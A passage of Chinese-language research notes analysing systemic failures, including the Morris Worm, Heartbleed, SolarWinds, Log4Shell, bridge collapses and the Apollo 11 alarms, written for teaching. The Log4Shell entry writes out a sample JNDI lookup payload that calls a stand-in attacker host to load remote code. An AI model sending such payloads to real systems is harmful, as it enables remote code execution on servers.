  - 海嘯高度假設過低（latent）：以歷史記錄與偏低的設計基準設定海嘯牆高度，忽視地質/歷史證據指出更大海嘯的可能（國會調查 NAIIC 指此為「可預見」）。
  - 應急電源集中且置於低處（latent）：柴油發電機、電池、配電盤多置於會被同一場海嘯淹沒的低樓層——common-mode failure，冗餘形同虛設。
  - 監管俘獲與安全文化（latent）：NAIIC 結論這是「人為（man-made）」災難，根源於監管機構與業者（TEPCO）的勾結、不願正視已知風險。
  - 應變準備不足（latent）：對長時間 station blackout 的應變、移動電源/注水手段準備不足。
- **官方調查 / 關鍵結論 + URL**: 日本國會 *Fukushima Nuclear Accident Independent Investigation Commission (NAIIC)* 報告（2012），主席黑川清——結論「這是一場深刻人為（profoundly man-made）的災難…可被預見與預防」。另有 IAEA Director General 報告（2015）。NAIIC 英文摘要: https://warp.da.ndl.go.jp/info:ndljp/pid/3856371/naiic.go.jp/en/report/ ；IAEA 報告: https://www.iaea.org/topics/response/fukushima-daiichi-nuclear-accident
- **常見誤解 / 要校準的迷思**:
  - 「地震/海嘯這種天災無法防」：被 NAIIC 推翻——委員會明指這是「人為災難」，更大海嘯的風險可預見、應急電源配置缺陷可改善。
  - 「輻射死了很多人」：要校準——輻射直接致死極少（官方認定個位數）；真正的人命損失多來自疏散與災後關聯死，這是核安溝通的重要校準。
  - 「反應爐被地震震毀」：不精確——反應爐成功 scram、撐過地震；是隨後的海嘯造成 station blackout、冷卻失效才導致熔毀。
- **信心**: ⚠️ 技術根因與 NAIIC「人為災難」結論 rock-solid；但「死亡人數」需嚴格區分（輻射直接致死 vs 疏散關聯死），數字依定義差異大、標 ⚠️。板凳備選：與 Chernobyl 同屬核能，作為「假設失效＋common-mode」對照可，但獨立成章與 Chernobyl 主題部分重疊。

---

# E. 資安 / 供應鏈作為系統性失效

## 19. Morris Worm（1988-11）— buffer overflow（fingerd）+ sendmail debug + fork 速率、單一栽培（monoculture）

- **日期 / 地點**: 1988-11-02 晚自 MIT（由康乃爾研究生 Robert Tappan Morris 釋出，刻意從 MIT 而非康乃爾發出以掩飾來源）。影響執行 4.2/4.3 BSD Unix 的 VAX 與 Sun-3 機器。✔
- **死傷 / 規模**: 無傷亡。約數小時內感染約 6,000 台主機，約當時連網機器的 10%（⚠️「6,000 台/10%」為當代估計、常被引用但精確數字有不確定性）。清除成本：上訴法院估計每台移除約 200–53,000 美元；Clifford Stoll 為 GAO 估總體經濟衝擊約 10 萬至 1,000 萬美元。✔（無傷亡）/ ⚠️（感染台數與成本為估計區間）
- **技術根因（精確）**: Morris worm 用多種傳播途徑：(1) fingerd 緩衝區溢位——fingerd 用 C 的 gets() 把網路輸入讀進一個 512-byte 的 stack 緩衝區、不檢查長度；worm 送超長字串覆寫 stack 上的 return address，使其指向緩衝區內植入的程式碼、執行 /bin/sh（經典 stack buffer overflow）。(2) sendmail 的 DEBUG 模式——當時許多系統出貨即開啟 sendmail debug，允許遠端把指令當收件人傳入並執行。(3) 信任關係——利用 rsh/rexec 與弱/無密碼帳號在互信主機間跳躍（含字典猜密碼）。致命設計缺陷在傳播控制：worm 本應檢查目標是否已感染以避免重複，但 Morris 為防被「假回報已感染」騙過、設計成「即使對方說已感染，仍有 1/7 機率重新感染」；此 1/7 重感染率使同一台機器被反覆感染、行程暴增（fork bomb 效應），把機器拖垮——這才是它造成大規模當機的主因（worm 本身無破壞性 payload）。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 不安全的 C 函式（latent）：gets() 對 stack 緩衝區無界寫入——語言/函式庫層級的不設防。
  - 預設開啟 debug 後門（latent）：sendmail 出貨即開 DEBUG，等於內建遠端執行後門。
  - 過度的互信與弱密碼（latent）：rsh/rexec 的傳遞信任與無密碼帳號讓橫向移動輕而易舉。
  - 單一栽培（monoculture，latent）：整個早期網際網路跑高度同質的 BSD Unix，同一組漏洞通殺幾乎所有機器——多樣性缺失放大爆炸半徑。
  - 作者的傳播控制邏輯失誤（trigger）：1/7 重感染率把「溫和傳播」變成「自我 DoS」，是它失控當機的直接原因。
- **官方調查 / 關鍵結論 + URL**: 無政府調查；權威技術剖析為 (1) Eugene H. Spafford, "The Internet Worm Program: An Analysis"（Purdue Tech Report CSD-TR-823, 1988）；(2) Mark Eichin & Jon Rochlis, "With Microscope and Tweezers: An Analysis of the Internet Virus of November 1988"（MIT, 1989）。法律後果：Morris 成為《Computer Fraud and Abuse Act》(CFAA) 首位被定罪者，判 3 年緩刑、400 小時社區服務、罰款 10,050 美元（United States v. Morris, 928 F.2d 504, 2d Cir. 1991）。Spafford 報告: https://spaf.cerias.purdue.edu/tech-reps/823.pdf ；With Microscope and Tweezers: https://www.cs.unc.edu/~jeffay/courses/nidsS05/attacks/seely-RTMworm-89.html （ACM: https://dl.acm.org/doi/10.1145/63526.63528）
- **常見誤解 / 要校準的迷思**:
  - 「Morris 想搞破壞/釋出病毒攻擊」：要校準——Spafford 指出 worm 不含任何破壞 payload，Morris 自稱意在「測量網際網路大小」；災難來自傳播控制的程式錯誤（1/7 重感染）而非惡意破壞。
  - 「就是 fingerd 緩衝區溢位」：不完整——它同時用了 sendmail debug、rsh 互信、密碼猜測等多途徑；真正把機器搞當的是重複感染導致的行程爆量。
  - 「病毒」：技術上是 worm（蠕蟲，自我傳播、不需寄生宿主檔），非 virus。
  - 「6,000 台是確切數字」：要校準——是當代估計，精確值不可考；重點是「約 10% 的網際網路」這個量級。
- **信心**: ✔ 技術根因 rock-solid（Spafford 與 Eichin/Rochlis 一級剖析）。⚠️ 僅「感染台數/成本」為估計區間。

## 20. Heartbleed（2014, CVE-2014-0160）— OpenSSL 缺少邊界檢查、被忽視的關鍵基礎設施

- **日期 / 地點**: 2014-04-07 公開揭露（由 Codenomicon 與 Google Security 各自獨立發現）。影響全球用 OpenSSL 1.0.1–1.0.1f 的伺服器。✔
- **死傷 / 規模**: 無傷亡。揭露時約 17%（約 50 萬台）受信任憑證機構認證的 HTTPS 伺服器易受攻擊；可洩漏伺服器記憶體中的私鑰、密碼、session cookie 等。✔（17%/50 萬為當代測量）
- **技術根因（精確）**: bug 在 OpenSSL 對 TLS/DTLS heartbeat 擴充（RFC 6520）的實作。heartbeat 請求帶一個 payload 與一個攻擊者可控的 payload_length 欄位；伺服器回應時，程式直接依 payload_length 的宣告值從記憶體複製這麼多 bytes 回傳，卻「沒有檢查這個宣告長度是否與實際收到的 payload 大小相符」（缺少邊界檢查）。於是攻擊者送一個極小 payload（如 1 byte）、卻宣告長度 64 KB，伺服器就會把該緩衝區之後緊鄰的多達約 64 KB 行程記憶體一併回傳——典型的 buffer over-read（越界讀取）。每次請求最多洩漏約 64 KB，可反覆抽取、且不留日誌痕跡。漏洞 2011-12-31 提交（開發者 Robin Seggelmann、審查者 Stephen Henson）、隨 1.0.1 於 2012-03 釋出，潛伏逾兩年。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 缺少最基本的邊界檢查（latent）：信任攻擊者宣告的長度、不與實際資料比對——C 手動記憶體管理 + 缺乏檢查的典型陷阱。
  - 程式碼審查未抓到（latent）：提交經審查仍漏掉此缺陷，顯示審查深度/工具不足。
  - 關鍵基礎設施嚴重缺乏資源（latent，本案最大教訓）：OpenSSL 被全球無數系統依賴，卻僅約兩名全職人力維護約 50 萬行關鍵程式碼、年捐款僅約 2,000 美元——「大家都用、沒人付錢養」的開源公地悲劇。
  - 無記憶體安全防護（latent）：無 ASAN/邊界檢查、未用記憶體安全語言，使越界讀取靜默成功。
- **官方調查 / 關鍵結論 + URL**: 無單一官方調查（CVE-2014-0160）。權威來源：OpenSSL 官方公告與 Codenomicon 的 heartbleed.com。後續系統性回應：Linux Foundation 成立 Core Infrastructure Initiative (CII)，由科技巨頭出資資助 OpenSSL 等被低估的關鍵開源專案——這是本案最重要的制度遺產。heartbleed.com: https://heartbleed.com/ ；NVD: https://nvd.nist.gov/vuln/detail/CVE-2014-0160 ；OpenSSL 公告: https://www.openssl.org/news/secadv/20140407.txt
- **常見誤解 / 要校準的迷思**:
  - 「Heartbleed 是病毒/惡意軟體」：錯。它是一個漏洞（vulnerability），不是會傳播的程式；危害在於可被遠端讀取記憶體。
  - 「攻擊者能拿到完整資料庫」：要校準——每次只洩漏緊鄰的約 64 KB 隨機記憶體片段，但可反覆抽取、且能命中私鑰/密碼，後果嚴重。
  - 「OpenSSL 是大公司產品」：要校準——它是極少人力、近乎無資金的志願開源專案，卻撐起全球大半 HTTPS；本案真正教訓是「關鍵基礎設施的隱形脆弱與資源缺口」。
  - 「心跳功能本來就危險」：不精確——危險的不是 heartbeat 概念，而是「信任攻擊者宣告長度、未做邊界檢查」這個具體實作缺陷。
- **信心**: ✔ rock-solid（CVE、RFC 6520、17%/50 萬、Seggelmann/2011-12-31、CII 皆多源一致）。

## 21. SolarWinds / SUNBURST（2020）— 供應鏈建置系統入侵

- **日期 / 地點**: 惡意更新於 2020-03 至 06 間隨 SolarWinds Orion 更新散布；2020-12-13 由 FireEye 公開揭露。歸因俄羅斯對外情報局關聯的 APT29（NOBELIUM / Cozy Bear）。✔
- **死傷 / 規模**: 無傷亡。約 18,000 個客戶組織下載了含後門的更新（「潛在受害」上限）；但實際被進一步利用、與攻擊者 C2 通訊的目標遠少於此（分析指實際後續入侵者少於約 100 個組織），含美國多個聯邦機構（財政部、商務部、國土安全部等）與大型企業。✔（18,000 為下載量；實際深入入侵 <100 為 FireEye/微軟分析）
- **技術根因（精確）**: 這不是 Orion 程式本身的漏洞，而是「建置（build）流程被入侵」的供應鏈攻擊。攻擊者先潛入 SolarWinds 的內部建置環境，植入一個名為 SUNSPOT 的惡意工具，專門監看 Orion 的 build；當 build 在編譯特定原始碼檔時，SUNSPOT 在「編譯當下」即時把後門程式碼（SUNBURST，一個惡意的 .dll）注入到該檔，編譯完成後再把原始碼還原、不留痕跡。如此產出的後門 .dll 會跟著正常流程被 SolarWinds 合法的程式碼簽章（code signing）簽署、經官方更新通道發布——對下游客戶而言，它是一個「官方簽章、來源可信」的更新。SUNBURST 安裝後潛伏約兩週才啟動、會檢查環境避開分析沙箱、再以擬態正常流量的 C2 與攻擊者通訊、選擇性地對高價值目標投放後續工具（如 TEARDROP/Cobalt Strike）。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 信任根被攻破（latent，本案核心）：防禦體系把「官方簽章的更新」當成可信——當建置系統本身被入侵，這個信任根失效，所有下游的簽章驗證都形同背書了惡意碼。
  - 建置環境安全薄弱（latent）：build pipeline 缺乏完整性監控與隔離，讓 SUNSPOT 能長期潛伏、即時竄改編譯產物。
  - 簽章只證明「來源」不證明「內容無害」（latent）：code signing 證明 .dll 來自 SolarWinds、不證明內容未被竄改植入——對「合法管道散布惡意內容」無防禦力。
  - 偵測導向「已知惡意」（latent）：SUNBURST 擬態正常流量、潛伏、避沙箱，繞過了以特徵/異常為主的偵測；最終是 FireEye 因自身被竊取紅隊工具才追查發現。
  - 自動更新放大爆炸半徑（latent）：受信任的自動更新通道把單一建置入侵瞬間擴散到 18,000 個組織。
- **官方調查 / 關鍵結論 + URL**: CISA 緊急指令 Emergency Directive 21-01（2020-12-13）；FireEye/Mandiant 與 Microsoft 的技術分析（SUNBURST、SUNSPOT、TEARDROP）。美國政府正式歸因俄羅斯 SVR（APT29）。結論：軟體供應鏈的建置流程是新型高價值攻擊面，「可信來源」不等於「可信內容」。CISA ED 21-01: https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise ；Mandiant/FireEye 分析: https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor ；CrowdStrike SUNSPOT 分析: https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/
- **常見誤解 / 要校準的迷思**:
  - 「SolarWinds 的軟體有漏洞被駭」：要校準——關鍵不是 Orion 有漏洞，而是「建置系統被入侵、在編譯時植入後門、再用合法簽章散布」；攻擊面是供應鏈與信任根，不是程式碼漏洞。
  - 「18,000 家公司都被入侵」：要校準——18,000 是「下載了後門更新」的上限；實際被攻擊者深入利用的目標遠少（分析指 <100），攻擊者精挑高價值目標。
  - 「防毒/簽章驗證應該擋得住」：錯——惡意碼帶官方合法簽章、來自官方更新通道，傳統信任機制反成幫兇。
  - 「是勒索軟體/破壞攻擊」：錯——這是長期潛伏的情報竊取（espionage）行動，重在隱匿與滲透而非破壞。
- **信心**: ✔ rock-solid（CISA/Mandiant/Microsoft/CrowdStrike 多源一致；SUNSPOT 編譯期注入、簽章散布、18,000 下載 vs <100 深入皆有來源）。

## 22. Log4Shell（CVE-2021-44228, 2021-12）— logging 中的 JNDI lookup —（板凳備選）

- **日期 / 地點**: 2021-12-09 公開揭露（漏洞報告於 2021-11-24 提交 Apache）。影響 Apache Log4j 2 版本 2.0-beta9 至 2.14.1。✔
- **死傷 / 規模**: 無傷亡。CVSS 嚴重度 10.0（最高）。因 Log4j 是 Java 生態極普遍的 logging 函式庫，全球數以百萬計的伺服器/應用瞬間暴露（從企業系統到遊戲 Minecraft），被稱為近年最嚴重、最廣泛的漏洞之一。✔（CVSS 10.0、普遍性）
- **技術根因（精確）**: Log4j 2 的訊息字串支援「lookup」插值語法 ${...}，其中包含 JNDI（Java Naming and Directory Interface）lookup：${jndi:...}。致命組合是 Log4j 會「對被記錄的訊息內容本身」做這種插值——若應用把任何攻擊者可控的字串（如 HTTP User-Agent header、聊天訊息、表單欄位）寫進 log，攻擊者只要讓字串含 ${jndi:ldap://attacker.com/a}，Log4j 在記錄時就會主動向攻擊者控制的 LDAP（或 RMI/DNS）伺服器發出 JNDI 查詢、抓回一個惡意 Java class 並載入執行——即未經驗證的 remote code execution (RCE)。攻擊面之所以恐怖，是「只要把惡意字串送到任何會被記錄的地方」即可觸發，無需登入、無需特權。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 危險的預設行為（latent）：Log4j 預設對 log 訊息內容做 JNDI lookup——把「記錄資料」這個本應無害的動作變成可執行任意程式碼的入口（資料/程式碼界線崩潰）。
  - 過度強大的功能（latent）：JNDI 允許從遠端載入並執行 class，是極危險的能力，卻被內建進一個普及的 logging 函式庫且預設啟用。
  - 深層遞移依賴不可見（latent）：Log4j 常作為「依賴的依賴」深埋在無數套件中，許多組織根本不知道自己用了它、用在哪——SBOM（軟體物料清單）缺失使盤點與修補極困難。
  - 「記錄使用者輸入」是普遍習慣（latent）：把 User-Agent 等使用者可控字串寫進 log 是業界常態，恰好成為觸發點。
- **官方調查 / 關鍵結論 + URL**: 無政府事故調查（屬漏洞）；美國 Cyber Safety Review Board (CSRB) 2022-07 發布專題報告，結論 Log4Shell 是「endemic（地方性長存）」漏洞、將在未來多年持續被利用，並凸顯開源依賴與 SBOM 的治理缺口。CSRB 報告: https://www.cisa.gov/resources-tools/resources/cyber-safety-review-board-csrb-report-log4j ；NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228 ；Apache 公告: https://logging.apache.org/log4j/2.x/security.html
- **常見誤解 / 要校準的迷思**:
  - 「就是個 logging 函式庫的小 bug」：要校準——是「log 訊息會被當程式碼插值並執行」的設計性危險，加上 Log4j 的極端普及，才成為 10.0 級災難。
  - 「升級 Log4j 就解決了」：要校準——難在「找出所有用到 Log4j 的地方」（深層遞移依賴），CSRB 強調這會 endemic 多年。
  - 「需要特權才能利用」：錯——只要攻擊者能讓惡意字串被記錄（如改 User-Agent），無需任何身分即可 RCE。
  - 「是 Java 的漏洞」：不精確——是 Log4j 對 JNDI lookup 的不安全使用，非 JVM 本身。
- **信心**: ✔ rock-solid（CVE、CVSS 10.0、JNDI/LDAP RCE、CSRB 報告皆多源一致）。板凳備選：與 Heartbleed、SolarWinds 同屬「資安/供應鏈系統性失效」群，作為「開源依賴治理＋資料/程式碼界線崩潰」的對照鮮明；獨立成章與 Heartbleed 的「關鍵基礎設施脆弱」主題部分呼應。

---

# F. 實體世界的先聲（跨領域，早於電腦）

## 23. Tacoma Narrows Bridge（1940）— aeroelastic flutter（不是單純共振，需校正此迷思）

- **日期 / 地點**: 主橋於 1940-07-01 通車，1940-11-07 中央跨距扭轉振盪加劇後墜入 Tacoma Narrows 海峽。地點美國華盛頓州。✔
- **死傷 / 規模**: 無人死亡（唯一罹難者是一隻被困車內、名為 Tubby 的可卡犬）。整座主跨損毀。✔
- **技術根因（精確）**: 橋面在約 35 mph（約 56 km/h）以上的穩定中等風速下發生 aeroelastic flutter（氣動彈性顫振）——一種自激（self-excited）、負阻尼的結構不穩定。機制是風與柔性橋面之間的回饋環：風吹動橋面→橋面的運動（尤其扭轉）改變了周圍氣流的流場與作用力相位→這個被改變的氣流反過來「同相位地」把更多能量灌進橋面的振盪→振幅持續成長而非衰減（負阻尼/正回饋）。一旦進入扭轉顫振模態，振幅在固定風速下不斷放大直到結構破壞。設計上的助因：橋面採實心鈑梁（solid plate girder）側緣而非鏤空桁架，使風無法穿過、橋面像機翼般「抓住」氣流——又窄又柔又實心的橋面是顫振的溫床。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 對動態氣動行為認識不足（latent，時代局限）：1940 年的橋樑設計只算靜態風壓，尚無 aeroelastic flutter 的設計理論與分析工具。
  - 過於纖細、實心側緣的橋面（latent）：為美觀/經濟採用又窄又柔的實心鈑梁，氣動上極不穩定。
  - 通車前的警訊被當趣聞（latent）：橋面在風中明顯上下「galloping」（故綽號 Galloping Gertie），施工與通車期間已知會晃，卻被視為可接受而非危險前兆。
  - 缺乏氣動風洞驗證（latent）：未以風洞測試橋面斷面的氣動穩定性。
- **官方調查 / 關鍵結論 + URL**: 1940 年 Federal Works Agency 委由 Theodore von Kármán 等人的調查；現代權威校正見 K. Yusuf Billah & Robert H. Scanlan, "Resonance, Tacoma Narrows Bridge Failure, and Undergraduate Physics Textbooks," *American Journal of Physics* 59(2), 1991——明確指出物理教科書把它當「共振」是錯的，正解是 aeroelastic flutter（自激振盪）。Billah & Scanlan PDF: https://www.vibrationdata.com/Tacoma.htm （AJP: https://pubs.aip.org/aapt/ajp/article/59/2/118/532864）
- **常見誤解 / 要校準的迷思**:
  - 「風的頻率剛好等於橋的自然頻率、發生共振（像歌聲震碎酒杯）」：這是最該校正的迷思，被 Billah & Scanlan 明確駁斥。不是外力頻率匹配自然頻率的「forced resonance」；是橋面自身運動從穩定氣流中「抽取」能量的「self-excited flutter」——能量來源是橋自己的運動改變了氣流，不是某個匹配頻率的外力。
  - 「一陣強風吹垮的」：錯。是約 35–40 mph 的中等穩定風（非陣風）持續灌能、振幅指數成長所致。
  - 「設計師算錯共振頻率」：誤導——當年根本沒有顫振理論可算；是整個學科尚未理解此現象。
  - 「死了很多人」：錯——零人死亡（僅一隻狗），它的價值在「人類首次以影像記錄到 flutter 致橋毀」的科學/工程意義。
- **信心**: ✔ rock-solid（Billah & Scanlan 為學界校正共識；flutter 非 resonance、35 mph、零死亡皆有來源）。此案的最高價值正是「校正『共振』迷思」本身。

## 24. Hyatt Regency 空橋崩塌（1981, Kansas City）— 連接細節的設計變更使載重加倍、114 死

- **日期 / 地點**: 1981-07-17 傍晚，美國密蘇里州 Kansas City 的 Hyatt Regency 飯店中庭；當時約 2,000 人正在中庭參加「茶舞會（tea dance）」。✔
- **死傷 / 規模**: 114 人死亡、216 人受傷。✔（NBS 調查；當時美國史上最致命的結構性崩塌）
- **技術根因（精確）**: 中庭懸吊著三層空中走道，由天花板垂下的鋼吊桿（hanger rod）支撐。原始設計：每根吊桿「一根到底」、從天花板連續貫穿四樓與二樓走道的箱型梁，因此每根吊桿在四樓處的螺帽只承受「四樓那一層」走道的重量。鋼構廠（Havens）為施工方便提出變更：改成兩段、錯開的吊桿——上段從天花板吊住四樓走道、下段再從四樓走道吊住二樓走道。後果是四樓走道的箱型梁連接處從「只承受四樓自身」變成「同時承受四樓＋二樓兩層」的載重，該連接處受力大致加倍。雪上加霜的是：原始設計本身就已經只達建築規範要求的約 60%，變更後的實際連接強度更降到約 30%——遠不足以承載當天人群。崩塌時，吊桿螺帽直接從箱型梁（兩根 C 型槽鋼背對背銲成、內部中空）的銲縫處「拉穿」而出，四樓走道砸落到正下方的二樓走道，兩層連同人群墜落中庭。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 原始設計已不合格（latent）：連原始的一桿到底設計都只達規範約 60%，本身就缺乏裕度。
  - 施工便利凌駕結構審查（trigger）：鋼構廠為避免「在長吊桿全長刻牙」的麻煩而改成兩段，這個看似無害的施工變更使連接處載重加倍。
  - 設計變更未經實質工程複核（latent，本案核心）：變更透過 shop drawing 往返「核准」，但結構工程師（Jack Gillum / GCE）未實際重新計算此變更對連接處受力的影響——責任與複核在流程中蒸發。
  - 連接細節先天脆弱（latent）：箱型梁以 C 槽鋼背對背銲接、螺帽承力點正落在銲縫——最弱處承受集中載重，破壞時螺帽直接拉穿。
  - 通車前的撓度警訊未被重視（latent）：施工期間已有空橋過度變形/受力疑慮的跡象。
- **官方調查 / 關鍵結論 + URL**: 美國 National Bureau of Standards (NBS，今 NIST) 調查報告 *Investigation of the Kansas City Hyatt Regency Walkways Collapse*（NBSIR 82-2465, 1982）——確認連接處的設計變更使四樓箱型梁連接載重加倍、遠超其能力為直接技術原因。法律後果：設計工程師 Jack D. Gillum 與同事被 Missouri 州吊銷專業工程師執照（未被判刑事過失）。NBS 報告: https://nvlpubs.nist.gov/nistpubs/Legacy/IR/nbsir82-2465.pdf ；倫理案例: https://onlineethics.org/cases/hyatt-regency-walkway-collapse
- **常見誤解 / 要校準的迷思**:
  - 「設計變更讓載重加倍」這句要精準：變更使「四樓連接處」的載重加倍（從一層變兩層），不是整體載重加倍；且原始設計本就只有規範約 60%、變更後降到約 30%——是「本就不足，再砍半」。
  - 「鋼構廠擅自改、工程師不知情」：要校準——變更走了正式的 shop drawing 核准流程、工程師事務所蓋了章；致命的是「核准時沒有人實際重算這個連接」，是責任分散與複核失效，不是純粹偷改。
  - 「人太多壓垮的」：要校準——當天載重仍在「合格連接」應能承受的範圍內；垮掉是因為連接被設計成只剩約 30% 能力，不是異常超載。
  - 「焊接品質問題」：不精確——主因是連接細節的受力設計錯誤（載重路徑），非單純施工焊接瑕疵。
- **信心**: ✔ rock-solid（NBS/NIST 一級報告；114 死、216 傷、連接載重加倍、原設計 60%→變更後 30%、執照吊銷皆有來源）。

---

# G. 韌性正面案例（靠好設計撐過的險些災難）

## 25. Apollo 11 登月下降 1201/1202 程式警報（1969）— 導引電腦執行緒過載，優先權排程的重啟丟棄低優先工作、保住關鍵任務 → 成功著陸

- **日期 / 地點**: 1969-07-20，登月小艇（LM）"Eagle" 動力下降階段（接近月面時）。✔
- **死傷 / 規模**: 無傷亡——這是「險些釀災但靠設計化解」的正面對照案例：四次程式警報（1202 三次、1201 一次）險些觸發中止登月，最終安全著陸。✔
- **技術根因（精確）**: Apollo Guidance Computer (AGC) 在下降時接近運算負載上限。Aldrin 為了「萬一需要中止、好快速重新捕捉指揮艙」而把 rendezvous radar（會合雷達）開關置於某位置，使其與 AGC 之間因兩者電源相位不同步而不斷產生「cycle steal」——雷達持續向 AGC 索取本不需要的計數週期，憑空吃掉約 13% 的 CPU 時間。下降本就接近滿載，再被偷走 13%，AGC 的工作排程溢位、來不及在週期內完成所有排定工作，於是丟出 1202（"Executive overflow — no core sets"）與 1201（"Executive overflow — no VAC areas"）警報，意即「我超載了、沒有可用的工作儲存區了」。
- **關鍵設計（為何這是正面案例 / graceful degradation）**:
  - AGC 的作業系統由 Hal Laning 設計為「優先權導向、事件驅動的非同步 executive」，而非固定時序。每個工作有優先權。
  - 當偵測到過載（要不到 core set / VAC area），AGC 不會當機或鎖死，而是執行「軟重啟（software restart）」：丟棄低優先權、可重啟的工作，只重新排程並保住最高優先權的關鍵工作（如下降導引、引擎控制、與太空人溝通的 DSKY 顯示）。
  - 因此每次 1201/1202 後，AGC 都在毫秒級內重啟、繼續穩穩執行登月導引——低優先的雷達雜務被丟掉、關鍵任務毫髮無傷。這正是 graceful degradation（優雅降級）：超載時主動犧牲非必要工作以保住核心功能，而非全有或全無地崩潰。
  - 地面端：22 歲的 Jack Garman（在 Steve Bales 之下）事前已把各種程式警報的意義整理成小抄；當警報響起、Bales 與 Garman 在數秒內判定「只要警報不連續刷屏、導引仍正常，就 GO」，於是回報 "We're GO on that alarm"，登月繼續。Margaret Hamilton 領導的 MIT 團隊所寫的這套穩健、優先權排程的軟體是化險為夷的根本。
- **官方/權威紀錄 + URL**: NASA Apollo 11 Lunar Surface Journal（含 Bales/Garman/Hamilton 的回憶與技術說明）。Hamilton 後以此為「軟體工程」與容錯設計的典範。ALSJ 程式警報專頁: https://www.hq.nasa.gov/alsj/a11/a11.1201-pa.html ；技術背景: https://www.hq.nasa.gov/alsj/a11/a11.landing.html
- **常見誤解 / 要校準的迷思**:
  - 「電腦當機了還硬著陸」：錯且關鍵——AGC 從未當機；它是「依設計主動重啟、丟棄低優先工作、保住關鍵任務」，這正是它的成功而非故障。
  - 「1202 是電腦壞了/bug」：要校準——不是 bug，是真實的過載；軟體對過載的「正確而優雅」的反應才是亮點。根因（雷達 cycle steal 偷 CPU）是程序/介面設定問題，非軟體缺陷。
  - 「靠太空人手動救回」：要校準——太空人持續下降，但化解過載的是 AGC 的優先權重啟設計與地面的快速判讀；是「好設計＋好準備」而非臨場英雄式手動操作。
  - 「Margaret Hamilton 一人寫的」：要校準——她領導 MIT Instrumentation Lab 團隊，優先權排程 executive 由 Hal Laning 設計；應歸功於團隊與設計哲學。
  - 用途定位：本案是全書「反面災難」的對照組——同樣是「過載/異常」，差別在系統是「全有或全無地崩潰」還是「優先權排程、優雅降級」。可呼應 AT&T/Knight/CrowdStrike 等「缺乏降級而級聯崩潰」的反例。
- **信心**: ✔ rock-solid（NASA ALSJ 一級史料＋當事人 Bales/Garman/Hamilton 證言；cycle steal、13% CPU、優先權重啟、1202/1201 含義皆有來源）。

---

## 附：跨案的可重用主題（給各章作者參考，非新案例）

- **「沉默的失效」最危險**：Therac-25（錯誤代碼被略過）、TMI（指示燈騙人）、2003 停電（告警靜默卡死）、Heartbleed（不留日誌）——失效本身不致命，「看不到失效」才致命。
- **冗餘的 common-mode 陷阱**：Ariane 5（兩套相同 SRI 同因死）、2003 停電（主備 EMS 都崩）、Fukushima（電源全在會被同一海嘯淹的低處）——相同的備援對相同的觸發無效。
- **自動保護機制反噬**：Ariane（例外→停機而非降級）、Meta（DNS 不健康→撤回 BGP→全球消失）、Chernobyl（AZ-5 緊急停機反加反應性）——本意救命的機制在特定情境下成為災難放大器。
- **循環/隱藏依賴**：AWS S3（狀態頁自己跑在 S3 上）、Meta（修復工具依賴已掛的 DNS/網路）——故障時連「看見故障、修復故障」的工具都一起掛。
- **偏差正常化**：Challenger 與 Columbia（異常被逐步接受為常態）、TMI 指示燈習慣化——每次「沒出事」都侵蝕了安全邊界。
- **「可信來源 ≠ 可信內容」**：SolarWinds（合法簽章的後門）、Log4Shell（合法 log 動作觸發 RCE）——信任根或資料/程式碼界線一旦被攻破，既有的驗證機制反成幫兇。
- **優雅降級是解藥（正面）**：Apollo 11 的優先權重啟，是上述所有「全有或全無崩潰」的反命題。

<!-- 研究完成：A–G 共 25 案全數寫入。建立 2026-06-13。 -->

---

# H. 第二輪替換案例（2026-06-13 增補）

> 本輪新增 8 案，模板與 A–G 一致；技術名詞保留英文、來源標題/URL 原樣保留。增補時間 2026-06-13。可分配到各既有主題群：于伯林根/Knight 同屬「自動化反成危害」與「人機/級聯」；Gimli 屬「韌性正面案例（與 Apollo 11 呼應）」兼「一個數字」；Schiaparelli/Sleipner 屬「一個數字，一場崩塌」；Cloudflare/Fastly 屬「級聯/緊耦合」與「內容/設定當程式碼」；Flash Crash 屬「緊耦合金融自動化」（與 Knight 對照）；ERCOT 屬「偏差正常化＋緊耦合基礎設施」。

## 26. 于伯林根空中相撞（Überlingen mid-air collision, 2002-07-01）— TCAS RA 與 ATC 指令相牴觸

- **日期 / 地點**: 2002-07-01，23:35:32 CEST（21:35:32 UTC），德國 Baden-Württemberg 的 Überlingen 上空、康士坦茲湖（Lake Constance / Bodensee）附近，由瑞士 Skyguide 的 Zürich 管制區管制。✔（BFU 報告；Wikipedia）
- **死傷 / 規模**: 71 人全數罹難、無生還。Bashkirian Airlines Flight 2937（Tupolev Tu-154M，RA-85816）載 69 人（60 名乘客，含 46 名自 Ufa 出發、UNESCO 行程的俄羅斯學童；9 名機組）；DHL Flight 611（Boeing 757-23APF，A9C-DHL）載 2 名機組。✔（71 死、46 名學童為多源一致）
- **技術根因（精確）**: 兩機在 FL360 同高度、近乎垂直交會航向接近。當晚 Skyguide 因夜間維護把主雷達系統置於 fallback（降級）模式、且管制席間與外部的電話系統正在維修而不可用；另一名管制員在休息，現場僅 Peter Nielsen 一人同時兼顧兩個工作席。Nielsen 太晚才發現兩機間距即將不足，在約 23:34:49 指示 Tu-154 下降（descend）；幾乎同時，Tu-154 的 TCAS 發出 RA 指令「爬升（climb）」、DHL 757 的 TCAS 發出 RA「下降（descend）」。Tu-154 機組面對「管制員叫降、TCAS 叫升」的矛盾，選擇服從管制員、下降——與 TCAS RA 相反；DHL 則依 TCAS 下降。兩機因此同向下降、維持對撞航向，於 23:35:32 相撞。當年 TCAS 程序對「RA 與 ATC 衝突時何者優先」並不明確，俄方訓練/文化亦傾向以 ATC 為準。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 單人管制＋兼兩席（latent + trigger）：Skyguide 容許夜間單一管制員同時操作兩個工作席、另一人休息，喪失交叉監看與工作負荷餘裕。
  - 主雷達降級、光學/短期衝突警示弱化（latent）：主系統維護中、置於 fallback 模式，使衝突偵測與告警能力下降，Nielsen 太晚察覺間距不足。
